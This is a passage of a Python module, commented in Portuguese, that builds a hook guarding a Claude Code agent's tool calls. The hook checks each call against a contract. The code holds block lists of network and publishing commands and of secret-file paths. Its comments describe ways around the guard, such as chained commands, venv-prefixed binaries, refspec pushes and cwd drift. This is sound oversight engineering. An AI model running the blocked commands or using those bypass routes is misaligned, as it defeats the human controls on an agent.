"""Dispatcher único de fronteira: `boundary_guard.py` — Fase 2 do ROADMAP.

Hook `PreToolUse` (matcher `"*"`, cobre `Edit`/`Write`/`MultiEdit`/
`NotebookEdit`/`PowerShell`/`Bash`) que decide `allow`/`deny` a partir da
superfície do contrato ATIVO (`.harness/feature_list.json`), roteando por
tipo de tool. `Read`/`Glob`/`Grep`/`Task`/`WebFetch`/`TodoWrite` passam sem
análise. Tool desconhecida: nome com cara de escrita
(write/create/edit) → `deny`; resto → `allow` logado (política mínima de
deploy single-user, não allowlist MCP abrangente).

Quatro garantias, nesta ordem, sempre:

1. Runtime floor — incondicional, antes de checar contrato: push, rede/
   publicação não planejada, escrita em segredo nunca viram `allow`.
2. Proteção de teste — arquivo que casa `test_glob` só edita se alguma
   tarefa do contrato ativo o declarar em `files[]`.
3. `docs/**` sempre gravável, exceto `AGENTS.md`/`CLAUDE.md`/`Plans.md`/
   `spec.md` e `.harness/harness.yaml` (defense-in-depth contra path
   traversal).
4. `.harness/scratch/**` e `.harness/progress.md` sempre graváveis —
   artefato temporário e bookkeeping do próprio harness.

Script gerado é standalone (stdlib apenas). Peças puras (`_parse_iso8601`,
`_feature_passes_map` etc.) têm fonte única, embutidas via
`inspect.getsource()` — nunca cópia digitada à mão, exceto o veto do
revisor (depende de `harness.review`, implementação própria em cada lado).

Feature-lock: transição para `passes:true` só vira `allow` com evidência
fresca em `.harness/evidence/`. Veto do revisor (Produtor-Revisor, Fase 4):
se `.harness/team/manifest.json` declarar os dois papéis, exige também
review aprovado e mais novo que a evidência.

`cwd` é ancorado em `repo_root` (`compiled-state-session.json`) para
sobreviver a `cd` do agente na sessão — sem isso o guard falha ABERTO.

Histórico de decisão completo, achados numerados, alternativas rejeitadas:
`docs/project/HISTORICO-boundary_guard-2026-07-30.md`.

"""

from __future__ import annotations

import hashlib
import inspect
import json
import re
import subprocess
from datetime import datetime
from pathlib import Path
from typing import Any

import yaml
from pydantic import ValidationError

from harness.branching import CONTRACT_BRANCH_PREFIX
from harness.config import HarnessConfig
from harness.hook_launcher import hook_command
from harness.install_command import (
    INSTALL_COMMAND_BY_PACKAGE_MANAGER,
    install_command_for,
)
from harness.killswitch import DISABLED_CHECK_SRC
from harness.review import ReviewError, is_test_diff, load_review
from harness.settings_paths import prepare_managed_settings, write_managed_settings
from harness.templates import PROGRESS_FILE as PROGRESS_FILE_PATH

HOOKS_DIR = ".harness/hooks"
BOUNDARY_HOOK_FILENAME = "boundary_guard.py"
SESSION_STATE_FILE = ".harness/compiled-state-session.json"
BOUNDARY_STATE_KEY = "boundary_guard_hook_command"
# T-03/onda-3: hash sha256 do conteúdo gravado em BOUNDARY_HOOK_FILENAME —
# permite ao hook SessionStart (stdlib-only) detectar edição à mão sem
# precisar re-renderizar (o que exigiria HarnessConfig/pydantic/yaml).
BOUNDARY_CONTENT_HASH_STATE_KEY = "boundary_guard_content_hash"
# Item 6 do backlog de correção do issue #1 (deriva de cwd): chave gravada em
# SESSION_STATE_FILE por `install_boundary_guard`, uma vez, no momento da
# compilação (`compile-session`) — a raiz absoluta do projeto-alvo, lida em
# runtime pelo hook standalone para ancorar `_resolve_path`/`_load_json` em
# vez do `cwd` reportado pela tool call (que pode derivar). Ver
# `_resolve_repo_root_anchor` mais abaixo e a seção correspondente do
# docstring do módulo.
REPO_ROOT_STATE_KEY = "repo_root"
LEGACY_GUARD_TESTS_MARKER = "guard_tests.py"
# T-01/onda-3: guard_test_runner.py (matcher Bash, sempre-`allow`, nunca lia
# o payload) deixou de ser gerado/registrado por `harness compile` — media
# ~125ms por chamada de Bash sem mudar nenhuma decisão, já que este hook
# (matcher `*`) cobre todo Bash. Mesmo tratamento do guard_tests.py legado
# logo abaixo: instalação existente com a entrada antiga não pode ficar
# rodando os dois hooks pra sempre só porque recompilou.
LEGACY_GUARD_TEST_RUNNER_MARKER = "guard_test_runner.py"

# Matcher do hook PreToolUse registrado em .claude/settings.json. "*" casa
# TODA tool call (confirmado via doc oficial do Claude Code — ver docstring
# do módulo, seção "Matcher do hook e roteamento explícito"); o roteamento
# por-tool acontece dentro de `main()` do script gerado, não no matcher.
BOUNDARY_HOOK_MATCHER = "*"


# ---------------------------------------------------------------------------
# Runtime floor (Python real, IMPORTÁVEL) — mesmos padrões usados dentro do
# script standalone gerado por `render_boundary_guard()` mais abaixo. O hook
# standalone não pode importar `harness.*` (roda fora do pacote instalado via
# subprocess); em vez de manter uma segunda cópia digitada à mão,
# `render_boundary_guard()` extrai o código-fonte real destas
# funções/constantes via `inspect.getsource()` e o embute no script gerado —
# uma única fonte de verdade. Esta versão importável existe tanto para ser
# testável via pytest direto quanto para que outros módulos do pacote (hoje,
# `session_permissions.py`) apliquem exatamente o mesmo critério.
_SHELL_SPLIT = re.compile(r"[\s;&|()<>`$\"']+")

FLOOR_BASH_SEQUENCES: list[list[str]] = [
    ["git", "push"],
    ["curl"],
    ["wget"],
    ["npm", "publish"],
    ["pip", "upload"],
    ["twine", "upload"],
    ["gh", "release"],
]


def _tokenize_command(command: str) -> list[str]:
    return [t for t in _SHELL_SPLIT.split(command or "") if t]


def _has_sequence(tokens: list[str], seq: list[str]) -> bool:
    n = len(seq)
    return n > 0 and any(tokens[i:i + n] == seq for i in range(len(tokens) - n + 1))


# ---------------------------------------------------------------------------
# Normalização da FORMA de invocação (Python real, IMPORTÁVEL) — Item 4 do
# backlog do dogfood venv-Windows.
#
# O match de superfície é por PREFIXO de tokens, então `verify_cmd: "pytest -q"`
# só liberava o comando que começa literalmente com `pytest`. Num venv Windows a
# forma que de fato funciona na Bash tool é `.venv/Scripts/pytest.exe -q` — ou
# seja, exatamente a que o guard negava. Descobrir a forma que passa é iterativo
# por natureza, e cada tentativa custava um ciclo `disable`/edit/`compile-session`
# /`enable` completo: foi o maior volume isolado de fricção da sessão real.
#
# A normalização reduz TRÊS formas de invocar o MESMO binário à mesma forma
# canônica, e é aplicada nos DOIS lados da comparação (segmento avaliado e
# entrada da allowlist) — é equivalência de forma, nunca ampliação de escopo:
#   `python -m <mod> …`          -> `<mod> …`
#   `<venv>/{Scripts,bin}/<bin>` -> `<bin> …`   (`.exe` removido)
#   `uv run <bin> …`             -> `<bin> …`
#
# Fora do escopo, deliberadamente:
#   - `python -c` / `python <script.py>` NÃO normalizam: não são invocação de
#     binário, e `-c` executa string arbitrária.
#   - `uv run --with <pkg> <bin>` NÃO normaliza (o token seguinte a `run` é uma
#     flag): `--with` instala pacote arbitrário num ambiente efêmero antes de
#     rodar, então a forma flagged não é equivalente à nua. Fica deny.
#   - basename genérico NÃO normaliza (`./scripts/deploy.sh` continua
#     `./scripts/deploy.sh`): só prefixo de venv, senão qualquer script no disco
#     casaria a allowlist de um homônimo.
#   - `source <venv>/activate && <cmd>` continua deny: `source` executa o
#     conteúdo de um arquivo no shell corrente, o que não é forma de invocação
#     de nada. Com a normalização a ativação deixa de ser necessária — a forma
#     `.venv/Scripts/<bin>` passa direto.
#
# Invariante inegociável: normalizar nunca pode abrir caminho de fuga do floor.
# Por isso `is_floor_bash_command` abaixo avalia as duas formas — a bruta E a
# normalizada. Sem isso, o Item 4 tornaria `.venv/Scripts/git.exe push` (que
# hoje já atravessa o floor e morre no default-deny da allowlist) um comando
# efetivamente liberado, transformando um furo latente em furo alcançável.
# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
# Subcomandos do proprio harness que o guard libera. FONTE UNICA: o hook gerado
# recebe esta lista bakeada (ele e stdlib-only e nao consegue importar
# `harness`), e `harness.session_permissions` a importa daqui para declarar a
# MESMA superficie no settings.local.json.
#
# Ela morava so dentro do texto do hook gerado, e o settings mantinha uma copia
# a mao "espelhando" — que ficou oito verbos para tras (blind, finish, budget,
# reconcile, decide, lesson, task, pr-draft) sem ninguem perceber, porque o
# efeito nao e deny: e prompt de permissao em comando que o proprio lifecycle
# manda rodar. Duas listas divergem; uma lista, nao.
#
# NAO inclui 'run' (orquestrador da era congelada, chama a API Anthropic — rede
# fora do floor). 'enable'/'disable' tambem ficam de fora: o agente nao mexe no
# kill-switch. 'harness' sozinho idem, senao viraria prefixo de 'run'.
# ---------------------------------------------------------------------------
HARNESS_CLI_VERBS: tuple[str, ...] = (
    "compile", "audit", "audit-runtime", "analyze", "preflight",
    "compile-contract", "compile-session", "verify", "team", "review",
    "supervise", "audit-team",
    # 'task' e o escape oficial documentado na skill plan
    # (harness task add-file) para ampliar a superficie de uma tarefa — sem ele,
    # o guard fechava a porta E escondia a chave (o proprio deny message
    # apontava um comando que o guard negava).
    "task",
    "finish", "budget", "pr-draft",
    # 'reconcile' e read-only e o passo 5 do lifecycle manda roda-lo na ABERTURA
    # de toda sessao: fora desta lista, o primeiro comando do ciclo seria negado
    # pelo hook que o proprio ciclo instalou.
    "reconcile",
    # 'decide' e 'lesson' escrevem em .harness/decisions.md e .harness/lessons.md
    # -- justamente os arquivos que ESTE guard proibe editar direto (plano de
    # controle nao se auto-amplia). Ou o verbo passa, ou os dois registros da
    # spine nunca sao escritos por ninguem. Superficie estreita: os dois so
    # acrescentam linha no fim do arquivo, nunca reescrevem.
    "decide", "lesson",
    # 'blind' e a camada 3 (secao 6 do design): monta o pacote em
    # .harness/scratch/ e grava o veredito em .harness/blind-review/ -- de novo
    # dentro de .harness/**, de novo pelo mesmo motivo.
    "blind",
    # 'health' e o passo 2 do lifecycle (secao 7.2 do design), e roda ANTES de
    # qualquer coisa na abertura -- inclusive antes de 'reconcile', que esta
    # nesta lista pelo mesmo motivo. Read-only por construcao: ele resolve
    # executavel no PATH e pergunta se um modulo importa, nunca corrige nada
    # (secao 8.3 proibe healing de infraestrutura).
    "health",
    # Formas de invocacao read-only: negar `harness --help` deixava o agente sem
    # sequer descobrir os subcomandos disponiveis (relatado ao vivo no deadlock
    # de bootstrap). 'doctor'/'status' sao read-only.
    "doctor", "status", "--help", "-h", "--version",
    # 'skips baseline' roda o verify_cmd de UMA feature (mesma superficie que
    # 'verify' ja libera) so para descobrir o que pulou e gravar em
    # .harness/skips-baseline/ -- mesmo escopo de escrita de 'blind' acima.
    "skips",
)

VENV_DIR_NAMES = (".venv", "venv")
VENV_BIN_DIR_NAMES = ("scripts", "bin")
PYTHON_MODULE_HEADS = ("python", "python3", "py")
#: Teto de passes do ponto-fixo de `normalize_invocation_tokens`. Três já cobre
#: o pior caso real (`.venv/Scripts/python.exe -m ruff` = venv + `-m`); o teto
#: existe só como backstop contra loop se alguma regra futura for cíclica.
_MAX_NORMALIZATION_PASSES = 4


def _strip_exe_suffix(token: str) -> str:
    """Remove o sufixo `.exe` (case-insensitive) de `token`. `pytest.exe` ->
    `pytest`; `arquivo.exemplo` intocado (match do sufixo inteiro, não de
    substring)."""
    if token.lower().endswith(".exe"):
        return token[:-4]
    return token


def venv_prefixed_binary(token: str) -> str | None:
    """`.venv/Scripts/pytest.exe` -> `pytest`; `None` se `token` não é um
    binário sob o diretório de scripts de um venv.

    O diretório precisa terminar EXATAMENTE nos dois segmentos
    `{.venv,venv}/{Scripts,bin}` (comparação por segmento, case-insensitive,
    aceitando `/` e `\\`), então tanto a forma relativa (`.venv/bin/ruff`)
    quanto a absoluta (`C:/proj/.venv/Scripts/ruff.exe`) casam, enquanto
    `meuvenv/bin/x` e `scripts/x` NÃO — comparar por `endswith` de string
    casaria os dois e transformaria qualquer diretório terminado em `venv`
    numa porta para a allowlist alheia."""
    normalized = (token or "").replace("\\", "/")
    if "/" not in normalized:
        return None
    dirname, _, base = normalized.rpartition("/")
    parts = [p for p in dirname.split("/") if p and p != "."]
    if len(parts) < 2:
        return None
    if parts[-1].lower() not in VENV_BIN_DIR_NAMES:
        return None
    if parts[-2].lower() not in VENV_DIR_NAMES:
        return None
    base = _strip_exe_suffix(base)
    if not base or base.startswith("-"):
        return None
    return base


def normalize_invocation_tokens(tokens: list[str]) -> list[str]:
    """Reduz a FORMA de invocação no CABEÇA de `tokens` à forma canônica.

    Aplica as três regras do bloco acima até o ponto fixo (teto
    `_MAX_NORMALIZATION_PASSES`), porque elas compõem:
    `.venv/Scripts/python.exe -m ruff check .` passa por venv-prefixo e depois
    por `-m`, chegando em `ruff check .`. Devolve uma lista NOVA; não muta a
    entrada. Lista vazia ou sem regra aplicável volta inalterada."""
    current = list(tokens or [])
    for _ in range(_MAX_NORMALIZATION_PASSES):
        if not current:
            return current
        head = current[0]
        venv_bin = venv_prefixed_binary(head)
        if venv_bin is not None:
            current = [venv_bin] + current[1:]
            continue
        base = _strip_exe_suffix(head).lower()
        if base in PYTHON_MODULE_HEADS and len(current) >= 3 and current[1] == "-m":
            current = current[2:]
            continue
        if (
            base == "uv"
            and len(current) >= 3
            and current[1] == "run"
            and not current[2].startswith("-")
        ):
            current = current[2:]
            continue
        return current
    return current


# Subcomandos de `git` em que o MODO (o token seguinte) decide se a operação é
# inócua ou destrutiva — `checkout -b` cria branch, `checkout .` descarta
# trabalho não commitado. Para estes, `suggested_allowlist_entry` não corta em
# dois tokens: a entrada de allowlist casa por prefixo, e sugerir `git checkout`
# entregaria ao usuário uma linha que libera o descarte junto com a criação.
GIT_MODE_SENSITIVE_SUBCOMMANDS = frozenset({
    "checkout", "switch", "branch", "restore",
    "reset", "clean", "rm", "stash",
})


def suggested_allowlist_entry(command: str) -> str | None:
    """Entrada de `governance.extra_allowed_commands` que liberaria `command`.

    Devolve a forma CANÔNICA (normalizada) e CURTA: binário + subcomando, ou só
    o binário quando não há subcomando. `None` para comando vazio.

    Duas escolhas de granularidade, ambas deliberadas:

    - **Normalizada**, então `.venv/Scripts/alembic upgrade head` sugere
      `alembic upgrade` — declarar a forma prefixada por caminho seria pior, e o
      guard reconhece as três formas equivalentes de qualquer jeito (Item 4).
    - **Dois tokens**, não a linha inteira. O casamento é por PREFIXO: declarar
      `alembic upgrade` cobre `--sql`, `head`, `+1` e o resto dos argumentos,
      que é o que o usuário quer ao liberar uma ferramenta. Declarar a linha
      inteira obrigaria uma entrada nova a cada variação de argumento — a
      fricção que o escape existe para remover. Declarar só `alembic` seria
      largo demais: liberaria `alembic downgrade` junto.

    Argumento que começa com `-` não entra (`ruff check .` → `ruff check`, mas
    `ruff --fix` → `ruff`), porque flag não é subcomando e travar nela produz
    uma entrada que não casa quase nada.

    EXCEÇÃO — subcomandos de `git` com modo destrutivo
    (`GIT_MODE_SENSITIVE_SUBCOMMANDS`): aí a regra de dois tokens produziria
    uma sugestão perigosa. `git checkout -b <branch>` cria branch e é inócuo,
    mas a entrada `git checkout` casa por PREFIXO e liberaria junto
    `git checkout .` e `git checkout <arquivo>` — descarte de trabalho não
    commitado, irreversível e invisível na revisão. Nesses subcomandos a
    sugestão inclui o TERCEIRO token (`git checkout -b`, `git reset --hard`),
    porque é o modo, não o subcomando, que separa o inócuo do destrutivo."""
    tokens = normalize_invocation_tokens(_tokenize_command(command))
    if not tokens:
        return None
    if len(tokens) >= 2 and not tokens[1].startswith("-"):
        if (
            tokens[0] == "git"
            and tokens[1] in GIT_MODE_SENSITIVE_SUBCOMMANDS
            and len(tokens) >= 3
        ):
            return " ".join(tokens[:3])
        return " ".join(tokens[:2])
    return tokens[0]


def command_escape_hint(command: str, repo_root=None) -> str:
    """Razão de deny de comando, com o bloco YAML PRONTO PARA COLAR.

    Postura C do Item 9 (decisão do dono do repo, 2026-07-27): não existe — e
    não vai existir — uma CLI `harness allow-command`. O caminho é o usuário
    editar `.harness/harness.yaml` no terminal dele. Essa decisão só se sustenta
    se editar for **trivial**, e é isso que esta função entrega: em vez de
    explicar onde fica a chave e torcer para a sintaxe sair certa, o deny já
    devolve o bloco exato, com o comando preenchido, pronto para o agente
    repassar e o usuário colar.

    Isso resolve de quebra a armadilha que o Item 3 criou: o hook lê o YAML com
    um parser mínimo que aceita só lista de bloco e de fluxo, e um usuário
    escrevendo à mão pode acertar uma sintaxe válida que o parser não entende —
    degradando a lista inteira para vazia. Um bloco ditado pelo produto sai
    sempre na forma que o parser entende.

    `repo_root` (issue #72) é repassado a `allowlist_yaml_hint` para decidir
    se o bloco colável precisa incluir o cabeçalho `governance:` — repo que
    nunca rodou `/harness-creator:init` não tem essa chave ainda.

    O objetivo declarado do harness é barrar o MÍNIMO: ele existe para o agente
    rodar horas sem humano no meio, com segurança. Todo deny que o usuário não
    consegue resolver em dez segundos é fricção que empurra para o kill-switch,
    e o kill-switch é desproteção total."""
    return (
        "Escapes, do mais barato ao mais caro. (1) O guard ja reconhece as "
        "formas EQUIVALENTES do que esta declarado: `python -m <bin>`, "
        "`.venv/Scripts/<bin>`, `.venv/bin/<bin>` e `uv run <bin>` valem tanto "
        "quanto o binario nu — NAO ha grafia a descobrir por tentativa e erro. "
        "(2) " + allowlist_yaml_hint(command, repo_root) + " (3) Replaneje via "
        "/harness-creator:plan so se o ESCOPO da tarefa mudou."
    )


def _yaml_has_top_level_governance_key(text: str) -> bool:
    """True se `text` (conteúdo de `harness.yaml`) tem uma chave `governance:`
    no nível 0 de indentação. Mesmo scanner mínimo de
    `parse_extra_allowed_commands_text` (Item 3) — reusado aqui para decidir
    se `allowlist_yaml_hint` precisa incluir o cabeçalho `governance:` no
    bloco colável (issue #72). Tab ou chave duplicada: indeterminado -> True
    (assume que a chave existe) — incluir de novo quebraria o parser mínimo
    do hook (chave duplicada degrada a lista inteira para vazia), enquanto
    assumir presença e estar errado só deixa de reforçar algo que faltava."""
    if "\t" in (text or ""):
        return True
    found = False
    for line in (text or "").splitlines():
        if _yaml_indent(line) != 0:
            continue
        stripped = line.strip()
        if stripped.startswith("#"):
            continue
        if _yaml_strip_inline_comment(stripped).strip() == "governance:":
            if found:
                return True
            found = True
    return found


def allowlist_yaml_hint(command: str, repo_root=None) -> str:
    """O bloco YAML pronto para colar, isolado de `command_escape_hint`.

    Extraido porque este e o UNICO escape de comando que funciona sem contrato
    ativo: o hook le `.harness/harness.yaml` a cada tool call, entao a entrada
    vale na chamada seguinte, sem `compile` e sem `/harness-creator:plan`. O
    deny de bootstrap (`_no_contract_command_deny`) precisa dele, e nao pode
    reusar `command_escape_hint` inteiro — os outros itens de la apontam
    `harness task add-file` e replanejamento, que nao existem sem contrato.
    Apontar escape inexistente foi o que fez o agente concluir que estava
    preso; apontar NENHUM escape tem o mesmo efeito.

    Issue #72: um repo que nunca rodou `/harness-creator:init` chega aqui SEM
    `.harness/harness.yaml` — o bloco antigo (que sempre omitia `governance:`,
    assumindo que a chave ja existia) apontava para dentro de um bloco que nao
    existe, em arquivo que nao existe. `repo_root` deixa a funcao ler o
    arquivo (fail-safe: ausente/ilegivel -> trata como sem a chave) e decidir
    se o bloco colavel precisa incluir `governance:` ou nao."""
    import os

    entry = suggested_allowlist_entry(command) or "<comando>"

    text = None
    try:
        path = os.path.join(str(repo_root or "."), HARNESS_YAML_RELATIVE_PATH)
        with open(path, "r", encoding="utf-8-sig") as handle:
            text = handle.read()
    except (OSError, ValueError):
        text = None
    has_governance_key = text is not None and _yaml_has_top_level_governance_key(text)

    if has_governance_key:
        # O bloco NAO repete `governance:` — colar de novo criaria chave
        # DUPLICADA, e o parser minimo do hook degrada a lista inteira para
        # vazia nesse caso.
        return (
            "Se o repo precisa deste comando de forma PERMANENTE, peca ao "
            "usuario para edita-lo no .harness/harness.yaml, no terminal DELE (fora "
            "do Claude Code). Se `extra_allowed_commands` ainda nao existe, colar "
            "estas duas linhas DENTRO do bloco `governance:` que ja esta la:\n\n"
            "  extra_allowed_commands:\n    - " + entry + "\n\n"
            "Se a chave ja existe, basta acrescentar a linha `    - " + entry + "` "
            "na lista. Vale na tool call SEGUINTE — o guard le esse arquivo a cada "
            "chamada, sem recompilar nada. E casa por PREFIXO: essa entrada libera "
            "o comando com qualquer argumento depois dela."
        )
    # Arquivo ausente ou sem a chave `governance:` (nunca rodou
    # /harness-creator:init) — o bloco colavel PRECISA do cabecalho, senao a
    # instrucao aponta pra dentro de um bloco que nao existe.
    return (
        "Este repositorio ainda nao tem `.harness/harness.yaml` com a chave "
        "`governance:` (rode /harness-creator:init para a governanca completa). "
        "Peca ao usuario para criar/editar o arquivo no terminal DELE (fora do "
        "Claude Code) com este bloco:\n\n"
        "governance:\n  extra_allowed_commands:\n    - " + entry + "\n\n"
        "Vale na tool call SEGUINTE — o guard le esse arquivo a cada chamada, "
        "sem recompilar nada. E casa por PREFIXO: essa entrada libera o comando "
        "com qualquer argumento depois dela."
    )


def _has_sequence_normalized(tokens: list[str], seq: list[str]) -> bool:
    """`_has_sequence`, mas normalizando a forma de invocação em CADA janela.

    O floor casa "aparece em qualquer posição" (não só no prefixo), então a
    normalização também precisa ser tentada a partir de cada posição: em
    `echo ok && .venv/bin/git push`, a forma prefixada por caminho só aparece
    no token 2."""
    n = len(seq)
    if n <= 0:
        return False
    for i in range(len(tokens)):
        if normalize_invocation_tokens(tokens[i:])[:n] == seq:
            return True
    return False


def is_floor_bash_command(command: str) -> bool:
    """True se `command` casa alguma sequência do runtime floor (git push,
    curl, wget, npm publish, pip upload, twine upload, gh release).

    Avalia a forma BRUTA e a NORMALIZADA (Item 4): sem a segunda,
    `.venv/Scripts/git.exe push` e `.venv/Scripts/twine.exe upload` não seriam
    reconhecidos, porque o token de cabeça deixa de ser `git`/`twine`. (As
    formas `uv run twine upload` e `python -m twine upload` já caíam no floor
    pela forma bruta — o match é por janela, não por prefixo.)"""
    tokens = _tokenize_command(command)
    return any(
        _has_sequence(tokens, seq) or _has_sequence_normalized(tokens, seq)
        for seq in FLOOR_BASH_SEQUENCES
    )


def _current_git_branch(cwd: str) -> str | None:
    """Nome da branch atual lendo `<cwd>/.git/HEAD` direto (stdlib, sem
    subprocess git). `None` em detached HEAD, fora de repo git, ou worktree
    linkado (`.git` é arquivo, não diretório) — nesses casos a checagem de
    branch protegida não se aplica (fail-open deliberado: o enforcement
    definitivo do "commit só via PR" é a branch protection server-side)."""
    try:
        text = (Path(cwd) / ".git" / "HEAD").read_text(encoding="utf-8")
    except OSError:
        return None
    text = text.strip()
    prefix = "ref: refs/heads/"
    if text.startswith(prefix):
        return text[len(prefix):]
    return None


# ---------------------------------------------------------------------------
# Exceção do floor de push (item 6 do backlog do dogfood miojo).
#
# `git push` era deny incondicional — qualquer branch, inclusive a
# `contract/<slug>` que a PRÓPRIA sessão criou via `ensure_contract_branch`, e
# inclusive depois de o contrato inteiro estar verde. O humano tinha que rodar
# o push à mão toda vez, no fim de um ciclo cuja aprovação real (o contrato) já
# tinha acontecido lá atrás. Para uma sessão longa e autônoma, isso é uma
# parada obrigatória num ponto onde não há mais nada a decidir.
#
# **`FLOOR_BASH_SEQUENCES` NÃO muda.** `is_floor_bash_command` continua
# dizendo que `git push` é floor, e é isso que mantém as outras camadas
# estritas: `verify.run_verify` e `contract._dry_check_verify_cmd` seguem
# recusando um `verify_cmd` que empurra, e `session_permissions` segue
# impedindo que qualquer regra compilada ecoe `Bash(git push...)` no
# `settings.local.json`. A abertura é uma EXCEÇÃO estreita avaliada dentro do
# `_evaluate_bash`/`_evaluate_powershell`, não um buraco no floor.
#
# **Fail-closed, ao contrário do floor de commit.** `_current_git_branch`
# devolve `None` em detached HEAD, worktree linkado ou repo ilegível, e o
# floor de commit trata isso como fail-open (o enforcement definitivo dele é a
# branch protection server-side). Aqui a postura se inverte: sem saber em que
# branch está, o push é negado. Não saber a branch é exatamente o caso em que
# um push poderia ir para onde não devia.
# ---------------------------------------------------------------------------

#: Flags aceitas num `git push` da branch do contrato. WHITELIST, nunca
#: blacklist: `--force`, `--force-with-lease`, `--mirror`, `--delete`, `-d`,
#: `--all` e `--tags` são negadas por não estarem aqui — e qualquer flag futura
#: do git nasce negada, em vez de nascer permitida até alguém notar.
PUSH_ALLOWED_FLAGS: tuple[str, ...] = ("-u", "--set-upstream")

#: Metacaracteres de shell que tiram o push da forma simples. Um `git push`
#: encadeado (`git push && curl evil`) casaria o floor pela janela do push e
#: entraria nesta exceção com carga arbitrária junto; a exceção só vale para o
#: comando isolado. `_split_shell_segments` resolveria isso, mas ela só existe
#: dentro do script gerado — esta peça é importável, então checa a string crua.
_PUSH_FORBIDDEN_CHARS: tuple[str, ...] = (
    ";", "&", "|", "<", ">", "`", "$", "(", ")", "\n", "\r",
)

#: Forma aceita de remote e branch. Recusa `:` de propósito: é o que mata
#: refspec explícito (`HEAD:main`, `contract/x:main`), a forma que permitiria
#: empurrar para uma branch protegida de dentro de uma branch de contrato.
_PUSH_ARG_PATTERN = re.compile(r"^[A-Za-z0-9._/-]+$")


def is_git_push_command(command: str) -> bool:
    """True se `command` invoca `git push` como comando de cabeça.

    Avalia a forma normalizada, pelo mesmo motivo de `is_floor_bash_command`:
    `.venv/Scripts/git.exe push` e `uv run git push` são o mesmo comando. É o
    que separa, dentro do floor, o caso que tem exceção (push) dos que não têm
    (`curl`, `npm publish`, `Invoke-WebRequest`) — e é match de PREFIXO, não de
    janela: `echo x && git push` não é um push isolado e não entra na exceção.
    """
    return normalize_invocation_tokens(_tokenize_command(command))[:2] == ["git", "push"]


def contract_branch_push_problem(
    command: str,
    branch: str | None,
    contract_slug: str,
    protected_branches: Any,
) -> str | None:
    """`None` se `command` é um `git push` seguro da branch do contrato ativo;
    senão, a razão do deny.

    Só devolve `None` quando TODAS valem: o comando é um `git push` isolado
    (sem metacaractere de shell); existe contrato ativo; a branch atual é
    conhecida, não é protegida e é exatamente `contract/<slug>` do contrato
    ativo; as flags estão em `PUSH_ALLOWED_FLAGS`; os posicionais são no
    máximo dois, sem `:`, com o remote fora da lista de protegidas e o
    refspec, se houver, igual à branch atual.

    Não decide se `command` é floor — quem chama já sabe disso, e os dois
    avaliadores do guard só chamam esta função depois de `is_git_push_command`.
    A primeira guarda abaixo é redundante com isso de propósito: é o contrato
    da função valendo para qualquer chamador, hoje ou depois.
    """
    if not is_git_push_command(command):
        return (
            "runtime floor: comando de push/publicacao/rede nao planejado - "
            "bloqueio incondicional, independente de contrato ativo"
        )

    tokens = normalize_invocation_tokens(_tokenize_command(command))

    if any(ch in (command or "") for ch in _PUSH_FORBIDDEN_CHARS):
        return (
            "runtime floor: `git push` so e liberado ISOLADO, sem encadeamento "
            "nem substituicao de comando - rode o push sozinho, numa tool call "
            "propria (o `git commit` que vem antes ja e allow por si)"
        )

    if not contract_slug:
        return (
            "runtime floor: `git push` sem contrato ativo - a excecao de push "
            "existe para a branch do contrato aprovado, e sem "
            ".harness/feature_list.json nao ha contrato de onde derivar branch "
            "nenhuma. Compile o contrato antes (`harness compile-contract`), ou "
            "rode o push no SEU terminal"
        )

    if branch is None:
        return (
            "runtime floor: `git push` com branch atual indeterminada (detached "
            "HEAD, worktree linkado ou repo ilegivel) - negado por seguranca. "
            "Nao saber a branch e exatamente o caso em que o push pode ir para "
            "onde nao devia; posicione o repo numa branch nomeada "
            "(`harness compile-session` posiciona em contract/<slug>)"
        )

    protected = set(protected_branches or ())
    if branch in protected:
        return (
            "runtime floor: `git push` a partir da branch protegida '" + branch
            + "' - proibido, so via PR"
        )

    expected = CONTRACT_BRANCH_PREFIX + contract_slug
    if branch != expected:
        return (
            "runtime floor: `git push` a partir de '" + branch + "', que nao e a "
            "branch do contrato ativo ('" + expected + "') - a excecao de push "
            "vale so para a branch que a propria sessao criou. Rode `harness "
            "compile-session` para posicionar o repo nela, ou rode o push no "
            "SEU terminal"
        )

    positionals = []
    for token in tokens[2:]:
        if token.startswith("-"):
            if token not in PUSH_ALLOWED_FLAGS:
                return (
                    "runtime floor: `git push` com a flag '" + token + "' - a "
                    "excecao aceita so " + " e ".join(PUSH_ALLOWED_FLAGS)
                    + ". Reescrita de historico e publicacao em massa "
                    "(--force, --force-with-lease, --mirror, --delete, --all, "
                    "--tags) continuam floor incondicional"
                )
            continue
        positionals.append(token)

    if len(positionals) > 2:
        return (
            "runtime floor: `git push` com argumentos demais - a excecao aceita "
            "no maximo `<remote> <branch>`"
        )

    for token in positionals:
        if _PUSH_ARG_PATTERN.match(token) is None:
            return (
                "runtime floor: `git push` com refspec/argumento '" + token
                + "' - a excecao nao aceita refspec explicito (`<origem>:"
                "<destino>`), que e a forma capaz de empurrar para uma branch "
                "protegida de dentro da branch do contrato"
            )

    if positionals and positionals[0] in protected:
        return (
            "runtime floor: `git push` para o remote '" + positionals[0]
            + "', que tem o nome de uma branch protegida - negado por "
            "ambiguidade"
        )

    if len(positionals) == 2 and positionals[1] != branch:
        return (
            "runtime floor: `git push` para a branch '" + positionals[1]
            + "', diferente da branch atual '" + branch + "' - a excecao "
            "empurra a branch do contrato para ela mesma, nada alem disso"
        )

    return None


def is_floor_secret_path(path: str) -> bool:
    """True se `path` é um arquivo de segredo do runtime floor (.env, .pem,
    id_rsa, ou nome contendo 'credentials')."""
    lower = (path or "").replace("\\", "/").lower()
    basename = lower.rsplit("/", 1)[-1]
    return (
        lower.endswith(".env")
        or lower.endswith(".pem")
        or lower.endswith("id_rsa")
        or "credentials" in basename
    )


def is_floor_bash_secret_redirect(command: str) -> bool:
    """True se `command` faz redirecionamento (`>`/`>>`) ou usa `tee` cujo
    ALVO casa `is_floor_secret_path` (correção do achado #3 do backlog de
    correção do issue #1: antes desta função, o floor de segredo só era
    checado no caminho Edit/Write — `_evaluate_bash` retornava `allow` sem
    olhar o alvo de nenhum redirecionamento).

    Escopo DELIBERADAMENTE restrito a redirecionamento/`tee` — não persegue
    escrita indireta via interpretador (`python -c "open('.env','w')..."`,
    `node -e ...`): custo desproporcional para o que este mecanismo cobre; a
    redireção é o caso comum e observável (foi o vetor citado no achado).

    Correção de bug (achado adversarial pós-implementação, validação Opus):
    a versão anterior extraía o alvo do `>`/`>>` com uma regex sobre o texto
    BRUTO do comando (`>>?\\s*([^\\s;&|<>]+)`), que CAPTURAVA as aspas junto
    do valor (`".env"` inteiro, aspas incluídas) — `is_floor_secret_path`
